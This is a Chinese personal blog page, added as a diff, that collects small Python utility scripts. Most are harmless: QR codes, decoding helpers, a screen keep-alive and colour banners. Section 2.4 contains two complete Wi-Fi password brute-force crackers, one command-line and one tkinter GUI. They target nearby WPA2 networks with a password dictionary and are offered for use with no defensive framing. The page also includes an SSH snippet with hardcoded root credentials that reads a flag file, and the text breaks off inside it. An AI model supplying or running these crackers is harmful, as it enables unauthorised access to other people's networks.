@@ -1,0 +1,899 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>Python小脚本（持续更新） | 小C♥天天</title>
+        <meta name="author" content="小C&天天">
+        <meta name="description" content="^v^">
+        <meta name="keywords" content="">
+        <link rel="icon" href="/images/icon.jpg">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        <link rel="stylesheet" href="/css/main.css">
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+        <link rel="stylesheet" href="/css/style.css">
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <form class="search">
+            <input type="text" placeholder="需要搜索什么？">
+            <button type="submit"></button>
+        </form>
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+
+<div id="home-posts-wrap" class=>
+<div class="article">
+    <div>
+        <h1>Python小脚本（持续更新） </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/3/14
+        </span>
+        
+        <span class="category">
+            <a href="/categories/乱七八糟">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                乱七八糟
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Python" style="color: #00a596">
+                    Python
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="壹-说明"><a href="#壹-说明" class="headerlink" title="壹 说明"></a>壹 说明</h1><p>该文章主要记录平时工作或者生活中经常使用的<code>Python</code>小脚本。</p>
+<span id="more"></span>
+<h1 id="贰-小脚本"><a href="#贰-小脚本" class="headerlink" title="贰 小脚本"></a>贰 小脚本</h1><h2 id="2-1-生成二维码"><a href="#2-1-生成二维码" class="headerlink" title="2.1 生成二维码"></a>2.1 生成二维码</h2><pre><code class="python"># 生成指定URL或者文字二维码
+# 不带图片
+# pip install qrcode 
+import qrcode
+text = input(&quot;输入文字或URL：&quot;)
+# 设置URL必须添加http://
+img =qrcode.make(text)
+img.save(&quot;./img.png&quot;)                            
+#保存图片至本地目录，可以设定路径
+img.show()
+</code></pre>
+<pre><code class="python"># 生成指定URL或者文字二维码
+# 带图片
+# pip install  myqr
+from MyQR import myqr
+import os
+def gakki_code():
+    version, level, qr_name = myqr.run(
+        # 二维码存储的东西，可以是字符串，也可以是网址(前面要加http(s)://)
+        words=&quot;https://www.baidu.com&quot;,  
+        version=1,  # 设置容错率为最高
+        # 控制纠错水平，范围是L、M、Q、H，从左到右依次升高
+        level=&#39;H&#39;,  
+        # 将二维码和图片合成
+        picture=r&quot;D:\Desktop\1.jpg&quot;,  
+        
+        colorized=True,  # 彩色二维码
+        # 用以调节图片的对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为1.0
+        contrast=1.0, 
+        # 用来调节图片的亮度，其余用法和取值同上
+        brightness=1.0,  
+        # 保存文件的名字，格式可以是jpg,png,bmp,gif
+        save_name=r&quot;D:\Desktop\gakki_code.gif&quot;,  
+        save_dir=os.getcwd()  # 控制位置
+    )
+gakki_code()
+</code></pre>
+<h2 id="2-2-保持屏幕存活"><a href="#2-2-保持屏幕存活" class="headerlink" title="2.2 保持屏幕存活"></a>2.2 保持屏幕存活</h2><pre><code class="python">import pyautogui
+import time
+
+# 调用在执行动作后暂停的秒数，只能在执行一些pyautogui动作后才能使用，建议用time.sleep
+pyautogui.PAUSE = 1
+# 启用自动防故障功能，左上角的坐标为（0，0），将鼠标移到屏幕的左上角，来抛出failSafeException异常
+pyautogui.FAILSAFE = False
+
+while True:
+    # 在像素200，200处点击
+    pyautogui.click(500, 500, 1)
+
+    # 移动到像素100，100处需要两秒
+    pyautogui.moveTo(1000,500, 2)
+    # 停止5秒
+    time.sleep(5)
+</code></pre>
+<h2 id="2-3-获取当前目录"><a href="#2-3-获取当前目录" class="headerlink" title="2.3 获取当前目录"></a>2.3 获取当前目录</h2><pre><code class="python"># -*- coding: utf-8 -*-
+import os
+
+def listdir(path, list_name):  #传入存储的list
+    for file in os.listdir(path):
+        file_path = os.path.join(path, file)
+        if os.path.isdir(file_path):
+            listdir(file_path, list_name)
+        else:
+            list_name.append(file_path)
+    return list_name
+a = list()
+b = listdir(&#39;./&#39;,a)
+for i in b:
+    print(i.split(&quot;./&quot;, 1)[1])
+</code></pre>
+<h2 id="2-4-python之wifi破解"><a href="#2-4-python之wifi破解" class="headerlink" title="2.4 python之wifi破解"></a>2.4 python之wifi破解</h2><pre><code class="python">import pywifi
+import time
+from pywifi import const
+
+
+# WiFi扫描模块
+def wifi_scan():
+    # 初始化wifi
+    wifi = pywifi.PyWiFi()
+    # 使用第一个无线网卡
+    interface = wifi.interfaces()[0]
+    # 开始扫描
+    interface.scan()
+    for i in range(4):
+        time.sleep(1)
+        print(&#39;\r扫描可用 WiFi 中，请稍后。。。（&#39; + str(3 - i), end=&#39;）&#39;)
+    print(&#39;\r扫描完成！\n&#39; + &#39;-&#39; * 38)
+    print(&#39;\r&#123;:4&#125;&#123;:6&#125;&#123;&#125;&#39;.format(&#39;编号&#39;, &#39;信号强度&#39;, &#39;wifi名&#39;))
+    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象
+    bss = interface.scan_results()
+    # 存放wifi名的集合
+    wifi_name_set = set()
+    for w in bss:
+        # 解决乱码问题
+        wifi_name_and_signal = (100 + w.signal, w.ssid.encode(&#39;raw_unicode_escape&#39;).decode(&#39;utf-8&#39;))
+        wifi_name_set.add(wifi_name_and_signal)
+    # 存入列表并按信号排序
+    wifi_name_list = list(wifi_name_set)
+    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
+    num = 0
+    # 格式化输出
+    while num &lt; len(wifi_name_list):
+        print(&#39;\r&#123;:&lt;6d&#125;&#123;:&lt;8d&#125;&#123;&#125;&#39;.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
+        num += 1
+    print(&#39;-&#39; * 38)
+    # 返回wifi列表
+    return wifi_name_list
+
+
+# WIFI破解模块
+def wifi_password_crack(wifi_name):
+    # 字典路径
+    wifi_dic_path = input(&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;)
+    with open(wifi_dic_path, &#39;r&#39;) as f:
+        # 遍历密码
+        for pwd in f:
+            # 去除密码的末尾换行符
+            pwd = pwd.strip(&#39;\n&#39;)
+            # 创建wifi对象
+            wifi = pywifi.PyWiFi()
+            # 创建网卡对象，为第一个wifi网卡
+            interface = wifi.interfaces()[0]
+            # 断开所有wifi连接
+            interface.disconnect()
+            # 等待其断开
+            while interface.status() == 4:
+                # 当其处于连接状态时，利用循环等待其断开
+                pass
+            # 创建连接文件（对象）
+            profile = pywifi.Profile()
+            # wifi名称
+            profile.ssid = wifi_name
+            # 需要认证
+            profile.auth = const.AUTH_ALG_OPEN
+            # wifi默认加密算法
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
+            # wifi密码
+            profile.key = pwd
+            # 删除所有wifi连接文件
+            interface.remove_all_network_profiles()
+            # 设置新的wifi连接文件
+            tmp_profile = interface.add_network_profile(profile)
+            # 开始尝试连接
+            interface.connect(tmp_profile)
+            start_time = time.time()
+            while time.time() - start_time &lt; 1.5:
+                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
+                if interface.status() == 4:
+                    print(f&#39;\r连接成功！密码为：&#123;pwd&#125;&#39;)
+                    exit(0)
+                else:
+                    print(f&#39;\r正在利用密码 &#123;pwd&#125; 尝试破解。&#39;, end=&#39;&#39;)
+
+# 主函数
+def main():
+    # 退出标致
+    exit_flag = 0
+    # 目标编号
+    target_num = -1
+    while not exit_flag:
+        try:
+            print(&#39;WiFi万能钥匙&#39;.center(35, &#39;-&#39;))
+            # 调用扫描模块，返回一个排序后的wifi列表
+            wifi_list = wifi_scan()
+            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理
+            choose_exit_flag = 0
+            while not choose_exit_flag:
+                try:
+                    target_num = int(input(&#39;请选择你要尝试破解的wifi：&#39;))
+                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入
+                    if target_num in range(len(wifi_list)):
+                        # 二次确认
+                        while not choose_exit_flag:
+                            try:
+                                choose = str(input(f&#39;你选择要破解的WiFi名称是：&#123;wifi_list[target_num][1]&#125;，确定吗？（Y/N）&#39;))
+                                # 对用户输入进行小写处理，并判断
+                                if choose.lower() == &#39;y&#39;:
+                                    choose_exit_flag = 1
+                                elif choose.lower() == &#39;n&#39;:
+                                    break
+                                # 处理用户其它字母输入
+                                else:
+                                    print(&#39;只能输入 Y/N 哦o(*￣︶￣*)o&#39;)
+                            # 处理用户非字母输入
+                            except ValueError:
+                                print(&#39;只能输入 Y/N 哦o(*￣︶￣*)o&#39;)
+                        # 退出破解
+                        if choose_exit_flag == 1:
+                            break
+                        else:
+                            print(&#39;请重新输入哦(*^▽^*)&#39;)
+                except ValueError:
+                    print(&#39;只能输入数字哦o(*￣︶￣*)o&#39;)
+            # 密码破解，传入用户选择的wifi名称
+            wifi_password_crack(wifi_list[target_num][1])
+            print(&#39;-&#39; * 38)
+            exit_flag = 1
+        except Exception as e:
+            print(e)
+            raise e
+
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<p>图形库</p>
+<pre><code class="python">
+from tkinter import *
+from pywifi import const
+import pywifi
+import time
+
+
+# 主要步骤：
+# 1、获取第一个无线网卡
+# 2、断开所有的wifi
+# 3、读取密码本
+# 4、设置睡眠时间
+def wificonnect(str, wifiname):
+    # 窗口无线对象
+    wifi = pywifi.PyWiFi()
+    # 抓取第一个无线网卡
+    ifaces = wifi.interfaces()[0]
+    # 断开所有的wifi
+    ifaces.disconnect()
+    time.sleep(1)
+    if ifaces.status() == const.IFACE_DISCONNECTED:
+        # 创建wifi连接文件
+        profile = pywifi.Profile()
+        profile.ssid = wifiname
+        # wifi的加密算法
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        # wifi的密码
+        profile.key = str
+        # 网卡的开发
+        profile.auth = const.AUTH_ALG_OPEN
+        # 加密单元,这里需要写点加密单元否则无法连接
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        # 删除所有的wifi文件
+        ifaces.remove_all_network_profiles()
+        # 设置新的连接文件
+        tep_profile = ifaces.add_network_profile(profile)
+        # 连接
+        ifaces.connect(tep_profile)
+        time.sleep(3)
+        if ifaces.status() == const.IFACE_CONNECTED:
+            return True
+        else:
+            return False
+
+
+def readPwd():
+    # 获取wiif名称
+    wifiname = entry.get().strip()
+    path = r&#39;./pwd.txt&#39;
+    file = open(path, &#39;r&#39;)
+    while True:
+        try:
+            # 读取
+            mystr = file.readline().strip()
+            # 测试连接
+            bool = wificonnect(mystr, wifiname)
+            if bool:
+                text.insert(END, &#39;密码正确&#39; + mystr)
+                text.see(END)
+                text.update()
+                file.close()
+                break
+            else:
+                text.insert(END, &#39;密码错误&#39; + mystr)
+                text.see(END)
+                text.update()
+        except:
+            continue
+
+
+# 创建窗口
+root = Tk()
+root.title(&#39;wifi破解&#39;)
+root.geometry(&#39;500x400&#39;)
+# 标签
+label = Label(root, text=&#39;输入要破解的WIFI名称：&#39;)
+# 定位
+label.grid()
+# 输入控件
+entry = Entry(root, font=(&#39;微软雅黑&#39;, 14))
+entry.grid(row=0, column=1)
+# 列表控件
+text = Listbox(root, font=(&#39;微软雅黑&#39;, 14), width=40, height=10)
+text.grid(row=1, columnspan=2)
+# 按钮
+button = Button(root, text=&#39;开始破解&#39;, width=20, height=2, command=readPwd)
+button.grid(row=2, columnspan=2)
+# 显示窗口
+root.mainloop()
+</code></pre>
+<h2 id="2-5-匹配当前文件夹的所有文件的名字"><a href="#2-5-匹配当前文件夹的所有文件的名字" class="headerlink" title="2.5 匹配当前文件夹的所有文件的名字"></a>2.5 匹配当前文件夹的所有文件的名字</h2><pre><code class="python">import os
+import re
+
+def listdir(path):  #传入存储的list
+    return os.listdir(path)
+
+filelist = listdir(&#39;./&#39;)
+
+for i in filelist:
+    # url_list = re.findall(r&#39;&quot;objURL&quot;:&quot;(http.*?)&quot;&#39;, r.text)
+    date = re.findall(r&quot;[0-9].*?\.(.*?)\.pptx.*?&quot;,i)
+    print(&quot;&#123;&#125;&quot;.format(date[0]))
+</code></pre>
+<h2 id="2-6-二进制转成字符串"><a href="#2-6-二进制转成字符串" class="headerlink" title="2.6 二进制转成字符串"></a>2.6 二进制转成字符串</h2><pre><code class="python">res = &quot;01110100011001010111001101110100&quot;
+for i in range(0,len(res), 8):
+    current = res[i:i+8]
+    dec = int(current, 2)
+    strr+=chr(dec)
+print(strr)
+</code></pre>
+<h2 id="2-7-base编码"><a href="#2-7-base编码" class="headerlink" title="2.7 base编码"></a>2.7 base编码</h2><pre><code class="python">import base64
+a=b&quot;4B3550444F505A4C4D52585734564A474B355644515633514B5A4658453233514B59374732554A584B5936574132444E4B5A46544D5933344B5A5146515232464A424E464B58333449343646343D3D3D&quot;
+# base64.b64encode为base64编码
+# base64.b64decode为base64编码
+# base64.b16decode为base16解码
+# base64.b32decode为base32解码
+# base64.b85decode为base85解码
+print(base64.b85decode(base64.b32decode(base64.b16decode(a))))
+</code></pre>
+<h2 id="2-8-凯撒密码"><a href="#2-8-凯撒密码" class="headerlink" title="2.8 凯撒密码"></a>2.8 凯撒密码</h2><pre><code class="python">s = &quot;4H3550444L505G4I4J52585734564G474H355644515633514H5G4658453233514H59374732554G584H5936574132444K4H5G46544J5933344H5G5146515232464G424K464H58333449343646343J3J3J&quot;
+t = &quot;&quot;
+for c in s:
+    if &#39;a&#39; &lt;= c &lt;= &#39;z&#39;: 
+        t += chr( ord(&#39;a&#39;) + ((ord(c)-ord(&#39;a&#39;)) + 20 )%26 )
+    elif &#39;A&#39; &lt;= c &lt;= &#39;Z&#39;:
+        t += chr( ord(&#39;A&#39;) + ((ord(c)-ord(&#39;A&#39;)) + 20 )%26 )
+    else:
+        t += c
+print(t)
+</code></pre>
+<h2 id="2-9-python随机字符串"><a href="#2-9-python随机字符串" class="headerlink" title="2.9 python随机字符串"></a>2.9 python随机字符串</h2><pre><code class="python">import string
+import random
+# 字符串
+data = string.ascii_letters+string.digits
+# 随机长度k (1&lt;= k &lt;=32)
+random_length = random.randint(1, 32)
+random_string = &#39;&#39;.join(random.sample(data, random_length))
+print(random_string)
+</code></pre>
+<h2 id="2-10-如何关闭warning的输出"><a href="#2-10-如何关闭warning的输出" class="headerlink" title="2.10 如何关闭warning的输出"></a>2.10 如何关闭warning的输出</h2><pre><code>import warnings
+warnings.filterwarnings(&quot;ignore&quot;)
+</code></pre>
+<h2 id="2-11-Ctrl-c退出进程异常"><a href="#2-11-Ctrl-c退出进程异常" class="headerlink" title="2.11 Ctrl+c退出进程异常"></a>2.11 Ctrl+c退出进程异常</h2><pre><code>try:
+    print(&quot;测试&quot;)
+except KeyboardInterrupt:
+    print(&quot;\033[31;1m[-]\033[0m 错误信息为：&#123;&#125;&quot;.format(&quot;您进行了Ctrl+C操作，程序将强制退出运行！&quot;))
+    sys.exit()
+</code></pre>
+<h2 id="2-12-标志颜色"><a href="#2-12-标志颜色" class="headerlink" title="2.12 标志颜色"></a>2.12 标志颜色</h2><pre><code class="python">MAIN = &#39;\033[38;5;50m&#39;
+PLOAD = &#39;\033[38;5;119m&#39;
+GREEN = &#39;\033[38;5;47m&#39;
+BLUE = &#39;\033[0;38;5;12m&#39;
+ORANGE = &#39;\033[0;38;5;214m&#39;
+RED = &#39;\033[1;31m&#39;
+END = &#39;\033[0m&#39;
+BOLD = &#39;\033[1m&#39;
+def print_banner(numList):
+    # 设置空列表
+    banner = list()
+    for num in numList:
+        # 定义英文字母的形状
+        if num == &#39;A&#39; or num == &#39;a&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;├&#39;,&#39;─&#39;,&#39;┤&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39;┴&#39;]])
+        elif num == &#39;B&#39; or num == &#39;b&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;├&#39;,&#39;─&#39;,&#39;┤&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;╯&#39;]])
+        elif num == &#39;C&#39; or num == &#39;c&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39; &#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;╯&#39;]])
+        elif num == &#39;D&#39; or num == &#39;d&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;╯&#39;]])
+        elif num == &#39;E&#39; or num == &#39;e&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;├&#39;,&#39;┤&#39;,&#39; &#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;F&#39; or num == &#39;f&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;├&#39;,&#39;┤&#39;,&#39; &#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39; &#39;]])
+        elif num == &#39;G&#39; or num == &#39;g&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;│&#39;,&#39;┌&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;H&#39; or num == &#39;h&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;├&#39;,&#39;─&#39;,&#39;┤&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39;┴&#39;]])
+        elif num == &#39;I&#39; or num == &#39;i&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;], [&#39; &#39;, &#39;│&#39;], [&#39; &#39;, &#39;┴&#39;]])
+        elif num == &#39;J&#39; or num == &#39;j&#39;:
+            banner.append([[&#39; &#39;, &#39; &#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;K&#39; or num == &#39;k&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39;┌&#39;,&#39;─&#39;], [&#39; &#39;, &#39;├&#39;,&#39;┤&#39;,&#39; &#39;], [&#39; &#39;, &#39;┴&#39;,&#39;└&#39;,&#39;─&#39;]])
+        elif num == &#39;L&#39; or num == &#39;l&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39; &#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39; &#39;], [&#39; &#39;, &#39;┴&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;M&#39; or num == &#39;m&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;┬&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;│&#39;,&#39;┴&#39;,&#39;│&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39;┴&#39;]])
+        elif num == &#39;N&#39; or num == &#39;n&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;┐&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;│&#39;,&#39;└&#39;,&#39;┐&#39;, &#39;│&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39;└&#39;,&#39;┘&#39;]])
+        elif num == &#39;O&#39; or num == &#39;o&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;P&#39; or num == &#39;p&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;├&#39;,&#39;─&#39;,&#39;╯&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39; &#39;]])
+        elif num == &#39;Q&#39; or num == &#39;q&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;╮&#39;]])
+        elif num == &#39;R&#39; or num == &#39;r&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;╮&#39;], [&#39; &#39;, &#39;├&#39;,&#39;┬&#39;,&#39;╯&#39;], [&#39; &#39;, &#39;┴&#39;,&#39;└&#39;,&#39; &#39;]])
+        elif num == &#39;S&#39; or num == &#39;s&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;T&#39; or num == &#39;t&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;┬&#39;,&#39;┐&#39;], [&#39; &#39;, &#39; &#39;,&#39;│&#39;,&#39; &#39;], [&#39; &#39;, &#39; &#39;,&#39;┴&#39;,&#39; &#39;]])
+        elif num == &#39;U&#39; or num == &#39;u&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        elif num == &#39;V&#39; or num == &#39;v&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;│&#39;,&#39; &#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;┬&#39;,&#39;┘&#39;]])
+        elif num == &#39;W&#39; or num == &#39;w&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;│&#39;,&#39;┬&#39;,&#39;│&#39;], [&#39; &#39;, &#39;└&#39;,&#39;┴&#39;,&#39;┘&#39;]])
+        elif num == &#39;X&#39; or num == &#39;x&#39;:
+            banner.append([[&#39; &#39;, &#39;─&#39;,&#39;┐&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;┌&#39;,&#39;┴&#39;,&#39;┬&#39;, &#39;┘&#39;], [&#39; &#39;, &#39;┴&#39;,&#39; &#39;,&#39;└&#39;,&#39;─&#39;]])
+        elif num == &#39;Y&#39; or num == &#39;y&#39;:
+            banner.append([[&#39; &#39;, &#39;┬&#39;,&#39; &#39;,&#39;┬&#39;], [&#39; &#39;, &#39;└&#39;,&#39;┬&#39;,&#39;┘&#39;], [&#39; &#39;, &#39; &#39;,&#39;┴&#39;,&#39; &#39;]])
+        elif num == &#39;Z&#39; or num == &#39;z&#39;:
+            banner.append([[&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┐&#39;], [&#39; &#39;, &#39;┌&#39;,&#39;─&#39;,&#39;┘&#39;], [&#39; &#39;, &#39;└&#39;,&#39;─&#39;,&#39;┘&#39;]])
+        else:
+            pass
+    # 添加字符
+    final = list()
+    # 设置颜色
+    init_color = 36
+    txt_color = init_color
+    # 用于计数
+    cl = 0
+    # 每个字母由三列数组组成
+    for charset in range(0, 3):
+        # 获取banner的个数，就是要输出的字母
+        for pos in range(0, len(banner)):
+            # 循环字母的内容
+            for i in range(0, len(banner[pos][charset])):
+                # 设置颜色
+                clr = f&#39;\033[38;5;&#123;txt_color&#125;m&#39;
+                char = f&#39;&#123;clr&#125;&#123;banner[pos][charset][i]&#125;&#39;
+                # 添加字符
+                final.append(char)
+                cl += 1
+                txt_color = txt_color + 36 if cl &lt;= 3 else txt_color
+            cl = 0
+            txt_color = init_color
+        init_color += 31
+        # 设置输出行数
+        if charset &lt; 2:
+            final.append(&#39;\n&#39;)
+    print(f&quot;&#123;&#39;&#39;.join(final)&#125;&quot;)
+    print(f&quot;&#123;END&#125;by A7cc\n&quot;)
+
+print(print_banner(&quot;abcde&quot;))
+</code></pre>
+<h2 id="2-13-ssh执行命令"><a href="#2-13-ssh执行命令" class="headerlink" title="2.13 ssh执行命令"></a>2.13 ssh执行命令</h2><pre><code class="python">import paramiko,time
+
+# 创建SSHClient 实例对象
+ssh = paramiko.SSHClient()
+# 设置信任远程机器，允许访问
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+# ssh连接远程机器，参数为  地址、端口、用户名、密码
+ssh.connect(&quot;10.10.10.2&quot;, 22, &quot;root&quot;, &quot;123456&quot;)
+# exec_command函数是执行命令，例如下面创建目录 text
+printin, printout, printerr = ssh.exec_command(&#39;cat /flag.txt&#39;)
